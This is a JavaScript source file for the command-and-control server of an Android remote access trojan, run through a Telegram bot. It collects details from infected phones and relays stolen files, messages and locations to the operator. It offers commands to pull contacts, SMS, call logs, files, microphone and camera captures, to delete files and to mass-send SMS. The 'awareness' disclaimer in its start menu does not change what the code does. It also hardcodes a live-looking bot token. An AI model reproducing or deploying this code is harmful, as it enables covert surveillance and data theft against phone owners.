const express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';
const address = 'https://www.google.com';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ⭐ الحل: استخدام Polling مع إعدادات خاصة
const bot = new TelegramBot(token, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Routes
app.get('/', (req, res) => {
    res.send('<h1 align="center">تم تحميل الخادم بنجاح</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    bot.sendDocument(id, req.file.buffer, {
        caption: `• رسالة من جهاز <b>${req.headers.model}</b>`,
        parse_mode: 'HTML'
    }, { filename: filename, contentType: 'application/txt' });
    res.send('');
});

app.post('/uploadText', (req, res) => {
    bot.sendMessage(id, `• رسالة من جهاز <b>${req.headers.model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    bot.sendLocation(id, req.body.lat, req.body.lon);
    bot.sendMessage(id, `• الموقع من جهاز <b>${req.headers.model}</b>`, { parse_mode: 'HTML' });
    res.send('');
});

// WebSocket Connection
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { model, battery, version, brightness, provider });
    
    console.log(`New device connected: ${model}`);
    
    bot.sendMessage(id, `• جهاز جديد متصل ✅\n\n` +
        `• طراز الجهاز📱 : <b>${model}</b>\n` +
        `• بطارية 🔋 : <b>${battery}</b>\n` +
        `• نسخة أندرويد : <b>${version}</b>\n` +
        `• سطوع الشاشة : <b>${brightness}</b>\n` +
        `• نوع الشرحة SIM : <b>${provider}</b>`, { parse_mode: 'HTML' });
    
    ws.on('close', () => {
        console.log(`Device disconnected: ${model}`);
        bot.sendMessage(id, `• الجهاز غير متصل ❌\n\n` +
            `• طراز الجهاز📱 : <b>${model}</b>\n` +
            `• بطارية 🔋 : <b>${battery}</b>\n` +
            `• نسخة أندرويد : <b>${version}</b>\n` +
            `• سطوع الشاشة : <b>${brightness}</b>\n` +
            `• نوع الشرحة SIM : <b>${provider}</b>`, { parse_mode: 'HTML' });
        clients.delete(ws.uuid);
    });

    ws.on('error', (error) => {
        console.log(`WebSocket error: ${error}`);
    });
});

// Bot Message Handling - كامل ومفصل
bot.on('message', (msg) => {
    console.log('Received message:', msg.text);
    
    const chatId = msg.chat.id;
    
    // التحقق من صلاحية المستخدم
    if (chatId != id) {
        bot.sendMessage(chatId, '• تم رفض الإذن');
        return;
    }

    // معالجة الردود على الرسائل
    if (msg.reply_to_message) {
        handleReplyMessage(msg);
        return;
    }

    // معالجة الأوامر الرئيسية
    handleMainCommand(msg);
});

function handleReplyMessage(msg) {
    const replyText = msg.reply_to_message.text;
    const userText = msg.text;

    if (replyText.includes('يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه')) {
        currentNumber = userText;
        bot.sendMessage(id, 'رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم', { 
            reply_markup: { force_reply: true } 
        });
        return;
    }

    if (replyText.includes('رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم')) {
        if (currentUuid && currentNumber) {
            wss.clients.forEach((ws) => {
                if (ws.uuid === currentUuid && ws.readyState === WebSocket.OPEN) {
                    ws.send(`send_message:${currentNumber}/${userText}`);
                }
            });
            resetCurrent();
            showMainMenu();
        }
        return;
    }

    if (replyText.includes('رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
        if (currentUuid) {
            wss.clients.forEach((ws) => {
                if (ws.uuid === currentUuid && ws.readyState === WebSocket.OPEN) {
                    ws.send(`send_message_to_all:${userText}`);
                }
            });
            resetCurrent();
            showMainMenu();
        }
        return;
    }

    // ... (معالجة الردود الأخرى بنفس الطريقة)
}

function handleMainCommand(msg) {
    const text = msg.text;

    if (text === '/start') {
        showStartMenu();
        return;
    }

    if (text === '📱الأجهزة المتصلة') {
        showConnectedDevices();
        return;
    }

    if (text === '📋قائمة الأوامر') {
        showCommandsList();
        return;
    }

    // إذا لم يتعرف على الأمر
    bot.sendMessage(id, '• لم أفهم الأمر، استخدم /start للبدء');
}

function showStartMenu() {
    bot.sendMessage(id, 
        '• • مرحبا بك في البوت 🖐\n\n' +
        '• رجاء عدم استعمال البوت فيما يغضب الله\n' +
        '• هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n' +
        '• المطور: @king_1_4\n' +
        '• قناتي: t.me/Abu_Yamani\n\n' +
        '• اختر من القائمة:', { 
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['📱الأجهزة المتصلة'], 
                ['📋قائمة الأوامر']
            ],
            resize_keyboard: true
        }
    });
}

function showConnectedDevices() {
    if (clients.size === 0) {
        bot.sendMessage(id, '• لا تتوفر أجهزة توصيل ❌\n\n');
        return;
    }

    let devicesList = '• قائمة الأجهزة المتصلة🤖 :\n\n';
    clients.forEach((device, uuid) => {
        devicesList += `• طراز الجهاز📱 : <b>${device.model}</b>\n` +
                      `• بطارية 🔋 : <b>${device.battery}</b>\n` +
                      `• نسخة أندرويد : <b>${device.version}</b>\n` +
                      `• سطوع الشاشة : <b>${device.brightness}</b>\n` +
                      `• نوع الشرحة SIM : <b>${device.provider}</b>\n\n`;
    });
    
    bot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
}

function showCommandsList() {
    if (clients.size === 0) {
        bot.sendMessage(id, '• لا تتوفر أجهزة توصيل ❌\n\n');
        return;
    }

    const deviceButtons = [];
    clients.forEach((device, uuid) => {
        deviceButtons.push([{ 
            text: `${device.model} (${device.battery}%)`, 
            callback_data: `device:${uuid}` 
        }]);
    });

    bot.sendMessage(id, '• اختر الجهاز لتنفيذ الأوامر:', {
        reply_markup: { 
            inline_keyboard: deviceButtons 
        }
    });
}

function resetCurrent() {
    currentUuid = '';
    currentNumber = '';
    currentTitle = '';
}

function showMainMenu() {
    bot.sendMessage(id, '• تم تنفيذ الأمر بنجاح ✅\n\nاختر من القائمة:', { 
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['📱الأجهزة المتصلة'], 
                ['📋قائمة الأوامر']
            ],
            resize_keyboard: true
        }
    });
}

// معالجة Callback Queries (مهم)
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;

    try {
        const [action, uuid] = data.split(':');
        
        if (action === 'device') {
            const device = clients.get(uuid);
            if (device) {
                showDeviceCommands(message, uuid, device);
            }
        }
        
        // الرد على callback query لمنع ظهور "الساعة"
        bot.answerCallbackQuery(callbackQuery.id);
        
    } catch (error) {
        console.error('Error handling callback:', error);
    }
});

function showDeviceCommands(message, uuid, device) {
    const keyboard = [
        [{ text: '📱تطبيقات', callback_data: `apps:${uuid}` }, { text: 'ℹ️معلومات الجهاز', callback_data: `device_info:${uuid}` }],
        [{ text: '📂الحصول على ملف', callback_data: `file:${uuid}` }, { text: '🗑️حذف الملف', callback_data: `delete_file:${uuid}` }],
        [{ text: '🎤ميكروفون', callback_data: `microphone:${uuid}` }, { text: '📷الكاميرا الرئيس', callback_data: `camera_main:${uuid}` }],
        [{ text: '📸كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }, { text: '📍الموقع', callback_data: `location:${uuid}` }],
        [{ text: '📞المكالمات', callback_data: `calls:${uuid}` }, { text: '👥جهات الاتصال', callback_data: `contacts:${uuid}` }],
        [{ text: '📳يهتز', callback_data: `vibrate:${uuid}` }, { text: '🔔إظهار الإشعار', callback_data: `toast:${uuid}` }],
        [{ text: '✉️رسائل', callback_data: `messages:${uuid}` }, { text: '📨ارسل رسالة', callback_data: `send_message:${uuid}` }],
        [{ text: '🔊تشغيل الصوت', callback_data: `play_audio:${uuid}` }, { text: '🔇إيقاف الصوت', callback_data: `stop_audio:${uuid}` }],
        [{ text: '📨إرسال رسالة إلى جميع جهات الاتصال', callback_data: `send_message_to_all:${uuid}` }]
    ];

    bot.editMessageText(`• اختر الأمر للجهاز: <b>${device.model}</b>`, {
        chat_id: message.chat.id,
        message_id: message.message_id,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
    });
}

// إضافة معالجة الأخطاء
bot.on('error', (error) => {
    console.error('Bot error:', error);
});

bot.on('polling_error', (error) => {
    console.error('Polling error:', error);
});

// بدء السيرفر
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log('Bot is ready and listening...');
});
